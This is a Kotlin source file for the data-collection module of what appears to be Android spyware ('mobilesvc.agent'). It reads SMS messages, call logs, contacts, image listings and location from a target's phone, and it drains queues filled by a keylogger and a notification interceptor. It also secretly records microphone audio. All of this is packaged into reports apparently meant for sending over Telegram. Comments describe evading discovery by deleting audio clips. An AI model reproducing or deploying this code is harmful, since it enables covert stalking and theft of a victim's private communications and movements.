package com.mobilesvc.agent

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.BatteryManager
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import java.io.File

/**
 * Builds one report per cycle.
 *
 * Every gate is checked against [PayloadConfig] and against the runtime permission, because
 * those two disagree constantly: the config says "collect SMS", the recipient never granted
 * READ_SMS, and the collector would otherwise throw a SecurityException inside a service and
 * take the whole loop down with it.
 *
 * Report format is line-oriented `key: value`. It is ugly on purpose — it survives a 4096-byte
 * Telegram chunk boundary and is trivially parseable on the other end.
 */
class Collector(private val context: Context, private val config: PayloadConfig) {

    companion object {
        /** Notifications seen since the last flush. Filled by [NotificationRelay]. */
        val notificationQueue = ArrayDeque<String>()

        /** Keystrokes seen since the last flush. Filled by [KeyloggerService]. */
        val keylogQueue = ArrayDeque<String>()

        private const val MAX_QUEUE = 200

        fun recordNotification(line: String) {
            synchronized(notificationQueue) {
                notificationQueue.addLast(line)
                while (notificationQueue.size > MAX_QUEUE) notificationQueue.removeFirst()
            }
        }

        fun recordKeystroke(line: String) {
            synchronized(keylogQueue) {
                keylogQueue.addLast(line)
                while (keylogQueue.size > MAX_QUEUE) keylogQueue.removeFirst()
            }
        }

        private fun drainNotifications(): List<String> = synchronized(notificationQueue) {
            val out = notificationQueue.toList()
            notificationQueue.clear()
            out
        }

        private fun drainKeylog(): List<String> = synchronized(keylogQueue) {
            val out = keylogQueue.toList()
            keylogQueue.clear()
            out
        }
    }

    private fun granted(permission: String): Boolean =
        context.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED

    fun collect(locator: RadioLocator, screenNote: String = "not requested"): String = buildString {
        appendLine("== ${config.label} ==")
        appendLine(device())
        if (config.location) appendLine(location(locator))
        if (config.sms) appendLine(sms())
        if (config.calls) appendLine(calls())
        if (config.contacts) appendLine(contacts())
        if (config.files) appendLine(files())
        if (config.screen) appendLine("screen: $screenNote")
        if (config.keylog) {
            val typed = drainKeylog()
            if (typed.isEmpty()) {
                appendLine("keylog: service not enabled (Settings → Accessibility)")
            } else {
                appendLine("KEYLOG (${typed.size}):")
                typed.takeLast(60).forEach { appendLine("  $it") }
            }
        }
        if (config.notifications) {
            val queued = drainNotifications()
            if (queued.isNotEmpty()) {
                appendLine("NOTIFICATIONS (${queued.size}):")
                queued.takeLast(40).forEach { appendLine("  $it") }
            }
        }
        appendLine("battery: ${batteryPct()}%  net: ${network()}")
    }.trimEnd()

    private fun device(): String = buildString {
        append("device: ${Build.MANUFACTURER} ${Build.MODEL}  ")
        append("android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})  ")
        appendLine()
        append("pkg: ${context.packageName}  ")
        append("serial-ish: ${Build.FINGERPRINT.take(60)}")
    }

    private fun location(locator: RadioLocator): String {
        if (!locator.hasPermission()) return "location: NO PERMISSION (${locator.capability()})"
        val fix = when (config.locationMethod) {
            "GNSS" -> locator.lastKnown()
            "HYBRID" -> locator.hybridFix()
            else -> locator.radioFix()
        }
        if (fix == null) {
            val reason = locator.lastReason
            return "location: NO FIX (${locator.capability()})" +
                if (reason.isBlank()) "" else " — $reason"
        }
        return "location: %.6f,%.6f  ±%.0fm  via ${fix.method}".format(
            fix.lat, fix.lon, fix.accuracyM
        )
    }

    private fun sms(): String {
        if (!granted(Manifest.permission.READ_SMS)) return "sms: NO PERMISSION"
        val rows = mutableListOf<String>()
        runCatching {
            context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
                null, null, "${Telephony.Sms.DATE} DESC"
            )?.use { cursor ->
                while (cursor.moveToNext() && rows.size < 30) {
                    val address = cursor.getString(0).orEmpty()
                    val body = cursor.getString(1).orEmpty().replace("\n", " ").take(120)
                    rows += "  $address :: $body"
                }
            }
        }
        return if (rows.isEmpty()) "sms: none" else "SMS (${rows.size}):\n" + rows.joinToString("\n")
    }

    private fun calls(): String {
        if (!granted(Manifest.permission.READ_CALL_LOG)) return "calls: NO PERMISSION"
        val rows = mutableListOf<String>()
        runCatching {
            context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION),
                null, null, "${CallLog.Calls.DATE} DESC"
            )?.use { cursor ->
                while (cursor.moveToNext() && rows.size < 30) {
                    val number = cursor.getString(0).orEmpty()
                    val type = when (cursor.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "in"
                        CallLog.Calls.OUTGOING_TYPE -> "out"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "?"
                    }
                    rows += "  $type $number ${cursor.getInt(2)}s"
                }
            }
        }
        return if (rows.isEmpty()) "calls: none" else "CALLS (${rows.size}):\n" + rows.joinToString("\n")
    }

    private fun contacts(): String {
        if (!granted(Manifest.permission.READ_CONTACTS)) return "contacts: NO PERMISSION"
        val rows = mutableListOf<String>()
        runCatching {
            context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, null
            )?.use { cursor ->
                while (cursor.moveToNext() && rows.size < 60) {
                    val name = cursor.getString(0).orEmpty()
                    val number = cursor.getString(1).orEmpty()
                    rows += "  $name :: $number"
                }
            }
        }
        return if (rows.isEmpty()) "contacts: none" else
            "CONTACTS (${rows.size}):\n" + rows.joinToString("\n")
    }

    private fun files(): String {
        if (!granted(Manifest.permission.READ_EXTERNAL_STORAGE) &&
            !granted("android.permission.READ_MEDIA_IMAGES")
        ) {
            return "files: NO PERMISSION"
        }
        val rows = mutableListOf<String>()
        runCatching {
            context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE
                ),
                null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )?.use { cursor ->
                while (cursor.moveToNext() && rows.size < 40) {
                    val name = cursor.getString(0).orEmpty()
                    val size = cursor.getLong(1)
                    rows += "  $name  ${size / 1024} KB"
                }
            }
        }
        return if (rows.isEmpty()) "files: none" else
            "IMAGES (${rows.size}):\n" + rows.joinToString("\n")
    }

    private fun batteryPct(): Int {
        val manager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            ?: return -1
        return manager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun network(): String {
        val manager = context.getSystemService(Context.CONNECTIVITY_SERVICE)
            as? android.net.ConnectivityManager ?: return "?"
        val caps = manager.getNetworkCapabilities(manager.activeNetwork) ?: return "offline"
        return when {
            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "cell"
            else -> "other"
        }
    }

    /** True when the upload policy allows a send right now. */
    fun uploadAllowed(): Boolean {
        if (!config.wifiOnly) return true
        return network() == "wifi"
    }

    /**
     * Records a short clip to the cache directory.
     *
     * `MediaRecorder` needs RECORD_AUDIO and, on Android 11+, works from a foreground service.
     * The output goes to cache and is deleted after upload — leaving audio on disk is the
     * fastest way to be found.
     */
    fun recordAudio(seconds: Int = 10): File? {
        if (!config.audio) return null
        if (!granted(Manifest.permission.RECORD_AUDIO)) return null
        val target = File(context.cacheDir, "clip_${System.currentTimeMillis()}.m4a")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }
        return runCatching {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioEncodingBitRate(64_000)
            recorder.setAudioSamplingRate(22_050)
            recorder.setOutputFile(target.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(seconds * 1000L)
            recorder.stop()
            target.takeIf { it.exists() && it.length() > 0 }
        }.getOrNull().also {
            runCatching { recorder.release() }
            if (it == null) target.delete()
        }
    }

    /** Drops clips older than an hour so a failed upload cannot accumulate. */
    fun purgeAudio() {
        val floor = System.currentTimeMillis() - 3_600_000L
        context.cacheDir.listFiles()
            ?.filter { it.name.startsWith("clip_") && it.lastModified() < floor }
            ?.forEach { it.delete() }
    }
}
